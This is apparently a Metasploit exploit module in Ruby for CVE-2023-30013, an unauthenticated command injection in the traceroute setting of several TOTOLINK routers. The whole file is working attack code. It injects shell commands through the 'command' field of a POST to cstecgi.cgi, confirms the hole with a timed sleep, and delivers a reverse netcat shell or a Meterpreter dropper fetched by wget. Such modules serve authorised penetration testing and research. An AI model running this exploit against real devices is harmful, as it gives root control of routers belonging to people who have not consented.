##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'rex/stopwatch'

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::CmdStager
  prepend Msf::Exploit::Remote::AutoCheck

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'TOTOLINK Wireless Routers unauthenticated remote command execution vulnerability.',
        'Description' => %q{
          Multiple TOTOLINK network products contain a command insertion vulnerability in setting/setTracerouteCfg.
          This vulnerability allows an attacker to execute arbitrary commands through the "command" parameter.
          After exploitation, an attacker will have full access with the same user privileges under
          which the webserver is running (typically as user `root`, ;-).

          The following TOTOLINK network products and firmware are vulnerable:
          - Wireless Gigabit Router model X5000R with firmware X5000R_V9.1.0u.6118_B20201102.zip;
          - Wireless Gigabit Router model A7000R with firmware A7000R_V9.1.0u.6115_B20201022.zip;
          - Wireless Gigabit Router model A3700R with firmware A3700R_V9.1.2u.6134_B20201202.zip;
          - Wireless N Router model N200RE V5 with firmware N200RE_V5_V9.3.5u.6095_B20200916.zip;
          - Wireless N Router model N200RE V5 with firmware N200RE_V5_V9.3.5u.6139_B20201216.zip;
          - Wireless N Router model N350RT with firmware N350RT_V9.3.5u.6095_B20200916.zip;
          - Wireless N Router model N350RT with firmware N350RT_V9.3.5u.6139_B20201216.zip;
          - Wireless Extender model EX1200L with firmware EX1200L_V9.3.5u.6146_B20201023.zip; and
          - probably more looking at the scale of impacted devices :-(
        },
        'License' => MSF_LICENSE,
        'Author' => [
          'h00die-gr3y <h00die.gr3y[at]gmail.com>', # MSF module contributor
          'Kazamayc https://github.com/Kazamayc', # Discovery of the vulnerability
        ],
        'References' => [
          ['CVE', '2023-30013'],
          ['URL', 'https://attackerkb.com/topics/xnX3I3PEgM/cve-2023-30013'],
          ['URL', 'https://github.com/Kazamayc/vuln/tree/main/TOTOLINK/X5000R/2']
        ],
        'DisclosureDate' => '2023-05-05',
        'Platform' => ['unix', 'linux'],
        'Arch' => [ARCH_CMD, ARCH_MIPSLE],
        'Privileged' => true,
        'Targets' => [
          [
            'Unix Command',
            {
              'Platform' => 'unix',
              'Arch' => ARCH_CMD,
              'Type' => :unix_cmd,
              'DefaultOptions' => {
                'PAYLOAD' => 'cmd/unix/reverse_netcat_gaping'
              }
            }
          ],
          [
            'Linux Dropper',
            {
              'Platform' => 'linux',
              'Arch' => [ARCH_MIPSLE],
              'Type' => :linux_dropper,
              'CmdStagerFlavor' => ['wget', 'echo'],
              'Linemax' => 65535,
              'DefaultOptions' => {
                'PAYLOAD' => 'linux/mipsle/meterpreter_reverse_tcp'
              }
            }
          ]
        ],
        'DefaultTarget' => 0,
        'DefaultOptions' => {
          'RPORT' => 80,
          'SSL' => false
        },
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'Reliability' => [REPEATABLE_SESSION],
          'SideEffects' => [IOC_IN_LOGS, ARTIFACTS_ON_DISK]
        }
      )
    )
    register_options([
      OptInt.new('SLEEP', [true, 'Sleep time in seconds to test blind command injection', 3])
    ])
  end

  def execute_command(cmd, _opts = {})
    num = rand(1..500)
    return send_request_cgi({
      'method' => 'POST',
      'ctype' => 'application/x-www-form-urlencoded',
      'uri' => normalize_uri(target_uri.path, 'cgi-bin', 'cstecgi.cgi'),
      'keep_cookies' => true,
      'data' => "{\"command\":\"127.0.0.1; #{cmd};#\",\"num\":\"#{num}\",\"topicurl\":\"setTracerouteCfg\"}"
    })
  end

  def check
    # Checking if the target is vulnerable by executing a randomized sleep to test the remote code execution
    print_status("Checking if #{peer} can be exploited.")
    sleep_time = datastore['SLEEP']

    # check response with echo command to determine if traceroute vulnerable function is available
    res = execute_command("echo #{sleep_time}")
    return CheckCode::Unknown('No response received from target.') unless res
    return CheckCode::Safe('No valid response received from target.') unless res.code == 200 && res.body.include?('success')

    # if traceroute vulnerable function is available, perform blind command injection using the sleep comnmand
    print_status("Performing command injection test issuing a sleep command of #{sleep_time} seconds.")
    res, elapsed_time = Rex::Stopwatch.elapsed_time do
      execute_command("sleep #{sleep_time}")
    end
    return CheckCode::Unknown('No response received from target.') unless res
    return CheckCode::Safe('No valid response received from target.') unless res.code == 200 && res.body.include?('success')

    print_status("Elapsed time: #{elapsed_time.round(2)} seconds.")
    return CheckCode::Safe('Blind command injection failed.') unless elapsed_time >= sleep_time

    CheckCode::Vulnerable('Successfully tested blind command injection.')
  end

  def exploit
    print_status("Executing #{target.name} for #{datastore['PAYLOAD']}")
    case target['Type']
    when :unix_cmd
      execute_command(payload.encoded)
    when :linux_dropper
      # Don't check the response here since the server won't respond
      # if the payload is successfully executed.
      execute_cmdstager({ linemax: target.opts['Linemax'] })
    end
  end
end
